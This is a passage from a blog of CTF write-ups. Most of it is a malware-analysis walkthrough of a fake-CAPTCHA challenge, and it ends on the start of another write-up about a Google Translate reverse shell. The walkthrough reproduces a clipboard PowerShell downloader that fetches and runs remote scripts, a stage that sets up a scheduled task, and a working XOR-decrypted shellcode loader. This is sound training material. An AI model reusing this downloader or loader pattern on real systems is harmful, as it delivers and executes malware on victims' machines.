</code></pre></div></div>

<p>Now we can copy the patched file to the RDP and run it:</p>

<p><img src="../../images/flag-viewer.png" alt="" /></p>

<p>I am pretty sure there is much more easier way to solve this challenge and I belive this isn’t intended way to solve it</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="misc" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Verify You Are Human</title><link href="http://localhost:4000/writeup/malware/Verify-You-Are-Human" rel="alternate" type="text/html" title="Huntress CTF 2025 - Verify You Are Human" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/malware/Verify-You-Are-Human</id><content type="html" xml:base="http://localhost:4000/writeup/malware/Verify-You-Are-Human"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>My computer said I needed to update MS Teams, so that is what I have been trying to do…</p>

  <p>…but I can’t seem to get past this CAPTCHA!</p>
</blockquote>

<p><strong>Provided:</strong> <code class="language-plaintext highlighter-rouge">10.0.21.131</code></p>

<h2 id="solution">Solution</h2>

<p>When accessing the web page, this command is put in our clipboard:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+''+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://10.0.21.131/?tic=1'&gt; $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
</code></pre></div></div>

<p>So it is accessing <code class="language-plaintext highlighter-rouge">http://10.0.21.131/?tic=1</code> and downloading it and saving it as .PS1 (PowerShell script).</p>

<p>After curling that we get a new obfuscated PowerShell script:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.21.131/?tic=1
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);
$HMGDSHGSHSHS = [guid]::NewGuid();
$OIEOPTRJGS = $env:LocalAppData;
irm 'http://10.0.21.131/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;
Add-Type -AssemblyName System.IO.Compression.FileSystem;
[System.IO.Compression.ZipFile]::ExtractToDirectory(
    "$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", 
    "$OIEOPTRJGS\$HMGDSHGSHSHS"
);
$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;
$WQRGSGSD = "$HMGDSHGSHSHS";
$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";
$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";
$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE \
    -Argument "`"$RYGSDFSGSH`"";
$TDRBRTRNREN = (Get-Date).AddSeconds(180);
$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;
$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" \
    -LogonType Interactive -RunLevel Limited;
Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER \
    -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;
Set-Location $PIEVSDDGs;
$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; 
Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; 
iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + \
    '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');
Remove-Item $MyInvocation.MyCommand.Path -Force;
Set-Clipboard
</code></pre></div></div>

<p>Here the most important thing is now accessing <code class="language-plaintext highlighter-rouge">http://10.0.21.131/?tic=2</code>. After curling that:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.21.131/?tic=2
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output &lt;FILE&gt;" to save to a file.
</code></pre></div></div>

<p>If we output it to a file and run the <code class="language-plaintext highlighter-rouge">file</code> command:</p>

<p>file tic2
tic2: Zip archive data, at least v2.0 to extract, compression method=deflate</p>

<p>Zip archive is interesting, let’s see what is there when we extract it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inflating: LICENSE.txt
inflating: _asyncio.pyd
inflating: _bz2.pyd
inflating: _ctypes.pyd
inflating: _decimal.pyd
inflating: _elementtree.pyd
inflating: _hashlib.pyd
inflating: _lzma.pyd
inflating: _multiprocessing.pyd
inflating: _overlapped.pyd
inflating: _queue.pyd
inflating: _socket.pyd
inflating: _sqlite3.pyd
inflating: _ssl.pyd
inflating: _uuid.pyd
inflating: _wmi.pyd
inflating: _zoneinfo.pyd
inflating: cpython-3134.pyc
inflating: libcrypto-3.dll
inflating: libffi-8.dll
inflating: libssl-3.dll
inflating: output.py
inflating: pyexpat.pyd
inflating: python.cat
inflating: python.exe
inflating: python3.dll
inflating: python313._pth
inflating: python313.dll
inflating: python313.zip
inflating: pythonw.exe
inflating: select.pyd
inflating: sqlite3.dll
inflating: unicodedata.pyd
inflating: vcruntime140.dll
inflating: winsound.pyd
</code></pre></div></div>

<p>A lot of stuff, but for now I will just look at <code class="language-plaintext highlighter-rouge">output.py</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import base64
#nfenru9en9vnebvnerbneubneubn
exec(base64.b64decode(
    "aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRf"
    "Ynl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVt"
    "ZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlf"
    "bGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVj"
    "cnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdI"
    "Ujl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRFAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVY"
    "NW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1"
    "ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09Jykp"
    "KQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChs"
    "ZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19j"
    "aGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3Zl"
    "TWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5"
    "cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp"
).decode('utf-8'))
#g0emgoemboemoetmboemomeio
</code></pre></div></div>
<p>Let’s decode the string we have:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbD32LlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp" | base64 -d
</code></pre></div></div>

<p>We got a new script:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(
    base64.b64decode(
        'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
        'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
        'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
    ), 
    base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
))

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), 
    ctypes.c_int(len(shellcode)), 
    ctypes.c_int(0x3000), 
    ctypes.c_int(0x40)
)

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_int(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)

functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
</code></pre></div></div>

<p>This is a shellcode execution script that:</p>

<ol>
  <li><strong>Decrypts</strong> a Base64-encoded payload using XOR decryption</li>
  <li><strong>Allocates</strong> executable memory in Windows</li>
  <li><strong>Executes</strong> the decrypted shellcode directly</li>
</ol>

<p>Let’s extract the shellcode and save it as <code class="language-plaintext highlighter-rouge">shellcode.bin</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

ciphertext = base64.b64decode(
    'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
    'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
    'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
)
key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')

decrypted_shellcode = xor_decrypt(ciphertext, key)

# Save to file for analysis
with open('shellcode.bin', 'wb') as f:
    f.write(decrypted_shellcode)

print(f"Shellcode saved to shellcode.bin ({len(decrypted_shellcode)} bytes)")
</code></pre></div></div>

<p>I will be using radare2 here:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 -a x86 -b 32 shellcode.bin
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00000000]&gt; aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: find and analyze function preludes (aap)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00000000]&gt; afl
0x00000000    7    130 fcn.00000000
[0x00000000]&gt; pdf @fcn.00000000
            ;-- oeax:
            ;-- eax:
            ;-- ebx:
            ;-- ecx:
            ;-- edx:
            ;-- esi:
            ;-- edi:
            ;-- eip:
            ;-- eflags:
┌ 130: fcn.00000000 ();
│ afv: vars(3:sp[0x84..0x86])
│           0x00000000      55             push ebp
│           0x00000001      89e5           mov ebp, esp
│           0x00000003      81ec80000000   sub esp, 0x80
│           0x00000009      6893d88484     push 0x8484d893
│           0x0000000e      6890c3c697     push 0x97c6c390
│           0x00000013      68c3909392     push 0x929390c3
│           0x00000018      6890c4c3c7     push 0xc7c3c490
│           0x0000001d      689c939c93     push 0x939c939c
│           0x00000022      68c09cc6c6     push 0xc6c69cc0
│           0x00000027      6897c69c93     push 0x939cc697
│           0x0000002c      6894c79dc1     push 0xc19dc794
│           0x00000031      68dec19691     push 0x9196c1de
│           0x00000036      68c3c9c4c2     push 0xc2c4c9c3
│           0x0000003b      b90a000000     mov ecx, 0xa
│           ; DATA XREF from fcn.00000000 @ 0x73(r)
│           0x00000040      89e7           mov edi, esp
│           ; CODE XREF from fcn.00000000 @ 0x4c(x)
│       ┌─&gt; 0x00000042      8137a5a5a5a5   xor dword [edi], 0xa5a5a5a5 ; [0xa5a5a5a5:4]=-1
│       ╎   0x00000048      83c704         add edi, 4
│       ╎   0x0000004b      49             dec ecx
│       └─&lt; 0x0000004c      75f4           jne 0x42
│           0x0000004e      c644242600     mov byte [var_26h], 0
│           0x00000053      c6857fffff..   mov byte [var_81h], 0
│           0x0000005a      89e6           mov esi, esp
│           0x0000005c      8d7d80         lea edi, [var_80h]
│           0x0000005f      b926000000     mov ecx, 0x26               ; '&amp;'
│           ; CODE XREF from fcn.00000000 @ 0x6b(x)
│       ┌─&gt; 0x00000064      8a06           mov al, byte [esi]
│       ╎   0x00000066      8807           mov byte [edi], al
│       ╎   0x00000068      46             inc esi
│       ╎   0x00000069      47             inc edi
│       ╎   0x0000006a      49             dec ecx
│       └─&lt; 0x0000006b      75f7           jne 0x64
│           0x0000006d      c60700         mov byte [edi], 0
│           0x00000070      8d3c24         lea edi, [esp]
│           0x00000073      b940000000     mov ecx, 0x40               ; '@'
│           0x00000078      b001           mov al, 1
│       ┌─&gt; 0x0000007a      8807           mov byte [edi], al
│       ╎   0x0000007c      47             inc edi
│       ╎   0x0000007d      49             dec ecx
│       └─&lt; 0x0000007e      75fa           jne 0x7a
│           0x00000080      c9             leave
└           0x00000081      c3             ret
</code></pre></div></div>

<p>There are some hex values pushed somewhere and also <code class="language-plaintext highlighter-rouge">0xa5a5a5a5</code> which I believe is a key that XORs each of those pushed values.</p>

<p>Now I just wrote a script to XOR them:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

ciphertext = base64.b64decode(
    'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
    'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
    'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
)
key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
decrypted = xor_decrypt(ciphertext, key)

# The pushed values from the disassembly
pushed_values = [
    0x8484d893, 0x97c6c390, 0x929390c3, 0xc7c3c490,
    0x939c939c, 0xc6c69cc0, 0x939cc697, 0xc19dc794,
    0x9196c1de, 0xc2c4c9c3
]

print("Decoding the pushed values with XOR 0xA5A5A5A5:")
decoded_string = b""

for value in pushed_values:
    # XOR with 0xA5A5A5A5
    decoded_value = value ^ 0xA5A5A5A5
    # Convert to bytes (little-endian)
    decoded_bytes = decoded_value.to_bytes(4, 'little')
    decoded_string += decoded_bytes
    print(f"{hex(value)} XOR A5A5A5A5 = {hex(decoded_value)} -&gt; {decoded_bytes}")
</code></pre></div></div>

<p>Output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Decoding the pushed values with XOR 0xA5A5A5A5:
0x8484d893 XOR A5A5A5A5 = 0x21217d36 -&gt; b'6}!!'
0x97c6c390 XOR A5A5A5A5 = 0x32636635 -&gt; b'5fc2'
0x929390c3 XOR A5A5A5A5 = 0x37363566 -&gt; b'f567'
0xc7c3c490 XOR A5A5A5A5 = 0x62666135 -&gt; b'5afb'
0x939c939c XOR A5A5A5A5 = 0x36393639 -&gt; b'9696'
0xc6c69cc0 XOR A5A5A5A5 = 0x63633965 -&gt; b'e9cc'
0x939cc697 XOR A5A5A5A5 = 0x36396332 -&gt; b'2c96'
0xc19dc794 XOR A5A5A5A5 = 0x64386231 -&gt; b'1b8d'
0x9196c1de XOR A5A5A5A5 = 0x3433647b -&gt; b'{d34'
0xc2c4c9c3 XOR A5A5A5A5 = 0x67616c66 -&gt; b'flag'
</code></pre></div></div>

<p>It looks like the flag but in reverse order, so I manually wrote each part and got the flag: <code class="language-plaintext highlighter-rouge">flag{d341b8d2c96e9cc96965afbf5675fc26}</code>. I believe it’s something with endianness.</p>

<p>Also later I wrote this script that automatically solves it and gives the flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import base64
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    """
    XOR decrypt ciphertext with repeating key
    """
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

def analyze_shellcode():
    """
    Complete analysis of the encrypted shellcode to extract the flag
    """
    # Base64 encoded payload and key from the original script
    ciphertext = base64.b64decode(
        'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
        'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
        'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
    )
    key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')

    # First layer: XOR decrypt the payload
    decrypted_shellcode = xor_decrypt(ciphertext, key)

    print("=== SHELLCODE ANALYSIS ===")
    print(f"Encrypted payload size: {len(ciphertext)} bytes")
    print(f"Key size: {len(key)} bytes")
    print(f"Decrypted shellcode size: {len(decrypted_shellcode)} bytes")

    # Save decrypted shellcode for analysis
    with open('shellcode.bin', 'wb') as f:
        f.write(decrypted_shellcode)

    # The shellcode pushes these values onto the stack (in assembly order)
    pushed_values_assembly_order = [
        0x8484d893, 0x97c6c390, 0x929390c3, 0xc7c3c490,
        0x939c939c, 0xc6c69cc0, 0x939cc697, 0xc19dc794,
        0x9196c1de, 0xc2c4c9c3
    ]

    # Reverse for stack order (last pushed = first in memory)
    pushed_values_stack_order = list(reversed(pushed_values_assembly_order))

    print("\n=== PUSHED VALUES ANALYSIS ===")
    print("Values as pushed in assembly (top to bottom in code):")
    for i, val in enumerate(pushed_values_assembly_order):
        print(f"  push 0x{val:08x}")

    print("\nValues in stack order (bottom to top in memory):")
    for i, val in enumerate(pushed_values_stack_order):
        print(f"  [esp+{i*4:02x}] = 0x{val:08x}")

    # XOR decode each value with 0xA5A5A5A5
    xor_key = 0xA5A5A5A5
    decoded_bytes = b""

    print("\n=== XOR DECODING ===")
    print(f"Using XOR key: 0x{xor_key:08x}")

    for i, val in enumerate(pushed_values_stack_order):
        result = val ^ xor_key
        result_bytes = result.to_bytes(4, 'little')
        decoded_bytes += result_bytes

        print(f"0x{val:08x} XOR 0x{xor_key:08x} = 0x{result:08x} -&gt; {result_bytes} -&gt; '{result_bytes.decode('ascii')}'")

    print(f"\nFull decoded string: {decoded_bytes}")

    # The shellcode copies 0x26 (38) bytes to a buffer
    flag_data = decoded_bytes[:0x26]
    print(f"\n=== FLAG EXTRACTION ===")
    print(f"Shellcode copies 0x26 (38) bytes to buffer")
    print(f"Flag: {flag_data.decode('ascii')}")

    # Clean up the flag (remove null bytes/padding if any)
    clean_flag = flag_data.decode('ascii').split('\x00')[0]
    print(f"Clean flag: {clean_flag}")

    return clean_flag

def execute_shellcode_demo():
    """
    Demonstrate how the original shellcode would execute (Windows only)
    """
    print("\n=== EXECUTION DEMO ===")
    try:
        ciphertext = base64.b64decode(
            'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'
            'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'
            'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='
        )
        key = base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')
        shellcode = xor_decrypt(ciphertext, key)

        print("Allocating executable memory...")
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0),
            ctypes.c_int(len(shellcode)),
            ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
            ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
        )

        print("Copying shellcode to memory...")
        buf = (ctypes.c_char * len(shellcode)).from_buffer(bytearray(shellcode))
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_int(ptr), 
            buf, 
            ctypes.c_int(len(shellcode))
        )

        print("Creating function pointer...")
        functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
        fn = functype(ptr)

        print("Executing shellcode...")
        fn()

    except Exception as e:
        print(f"Execution failed (expected on Linux): {e}")
        print("This is normal - the shellcode is Windows x86 assembly")

if __name__ == "__main__":
    flag = analyze_shellcode()
</code></pre></div></div>

<p>Running it we get:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=== SHELLCODE ANALYSIS ===
Encrypted payload size: 130 bytes
Key size: 22 bytes
Decrypted shellcode size: 130 bytes

=== PUSHED VALUES ANALYSIS ===
Values as pushed in assembly (top to bottom in code):
push 0x8484d893
push 0x97c6c390
push 0x929390c3
push 0xc7c3c490
push 0x939c939c
push 0xc6c69cc0
push 0x939cc697
push 0xc19dc794
push 0x9196c1de
push 0xc2c4c9c3

Values in stack order (bottom to top in memory):
[esp+00] = 0xc2c4c9c3
[esp+04] = 0x9196c1de
[esp+08] = 0xc19dc794
[esp+0c] = 0x939cc697
[esp+10] = 0xc6c69cc0
[esp+14] = 0x939c939c
[esp+18] = 0xc7c3c490
[esp+1c] = 0x929390c3
[esp+20] = 0x97c6c390
[esp+24] = 0x8484d893

=== XOR DECODING ===
Using XOR key: 0xa5a5a5a5
0xc2c4c9c3 XOR 0xa5a5a5a5 = 0x67616c66 -&gt; b'flag' -&gt; 'flag'
0x9196c1de XOR 0xa5a5a5a5 = 0x3433647b -&gt; b'{d34' -&gt; '{d34'
0xc19dc794 XOR 0xa5a5a5a5 = 0x64386231 -&gt; b'1b8d' -&gt; '1b8d'
0x939cc697 XOR 0xa5a5a5a5 = 0x36396332 -&gt; b'2c96' -&gt; '2c96'
0xc6c69cc0 XOR 0xa5a5a5a5 = 0x63633965 -&gt; b'e9cc' -&gt; 'e9cc'
0x939c939c XOR 0xa5a5a5a5 = 0x36393639 -&gt; b'9696' -&gt; '9696'
0xc7c3c490 XOR 0xa5a5a5a5 = 0x62666135 -&gt; b'5afb' -&gt; '5afb'
0x929390c3 XOR 0xa5a5a5a5 = 0x37363566 -&gt; b'f567' -&gt; 'f567'
0x97c6c390 XOR 0xa5a5a5a5 = 0x32636635 -&gt; b'5fc2' -&gt; '5fc2'
0x8484d893 XOR 0xa5a5a5a5 = 0x21217d36 -&gt; b'6}!!' -&gt; '6}!!'

Full decoded string: b'flag{d341b8d2c96e9cc96965afbf5675fc26}!!'

=== FLAG EXTRACTION ===
Shellcode copies 0x26 (38) bytes to buffer
Flag: flag{d341b8d2c96e9cc96965afbf5675fc26}
Clean flag: flag{d341b8d2c96e9cc96965afbf5675fc26}
</code></pre></div></div>

<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">flag{d341b8d2c96e9cc96965afbf5675fc26}</code></p>

<h2 id="conclusion">Conclusion</h2>

<p>This challenge demonstrates a multi-stage malware delivery system:</p>
<ol>
  <li>Initial PowerShell downloader</li>
  <li>ZIP archive containing Python environment</li>
  <li>Obfuscated Python script with embedded shellcode</li>
  <li>XOR-encrypted shellcode containing the flag</li>
</ol>

<p>The key was to follow the chain of execution and analyze the shellcode to extract the hidden flag. The shellcode used XOR encryption with <code class="language-plaintext highlighter-rouge">0xA5A5A5A5</code> to hide the flag in memory, and understanding the stack order was crucial for proper decoding.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="malware" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">Huntress CTF 2025 - XMDR</title><link href="http://localhost:4000/writeup/misc/XMDR" rel="alternate" type="text/html" title="Huntress CTF 2025 - XMDR" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/misc/XMDR</id><content type="html" xml:base="http://localhost:4000/writeup/misc/XMDR"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>We had a lot of fun helping the Internet understand what MDRs are, but we thought of the&gt;next the best thing:<br />
  <strong>why not have you <em>use one!</em></strong> 😄</p>
</blockquote>

<blockquote>
  <p>A host that you protect had some strange alerts fire off… can you analyze and triage to find other malicious activity?</p>
</blockquote>

<p>Provided IP: <code class="language-plaintext highlighter-rouge">10.1.182.225</code></p>

<hr />

<p>After accessing the site we see this:</p>

<p><img src="../../images/alerts.png" alt="" /></p>

<p>We can download the zip file.</p>

<p>After looking through the GTRS folder we notice that is the Google Translate Reverse Shell</p>

<p>I searched where are browser histories stored in windows system(for Google):
<code class="language-plaintext highlighter-rouge">C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History</code></p>

<p>We don’t see the extension, so what kind of file is it?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>History: SQLite 3.x database, last written using SQLite version 3050000, file counter 19, database pages 77, cookie 0x21  
, schema 4, UTF-8, version-valid-for 19
</code></pre></div></div>

<p>after extracting link and URL decoding them I find these:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://translate.google.com/?sl=auto&amp;tl=en&amp;text=STARTCOMMAND  
begin 664 -  
,=&amp;%S:VQI&lt;W0@+W8*  
`  
end  
ENDCOMMAND  
&amp;op=translate
</code></pre></div></div>

<p>I went to the dcode.fr for their cipher identifier and it said it is UUencoded</p>

<p>So I wrote a a script to url decode history links and to extract just the part between the 
<code class="language-plaintext highlighter-rouge">begin 664 -</code> and <code class="language-plaintext highlighter-rouge">end</code></p>

<h3 id="python">Python</h3>

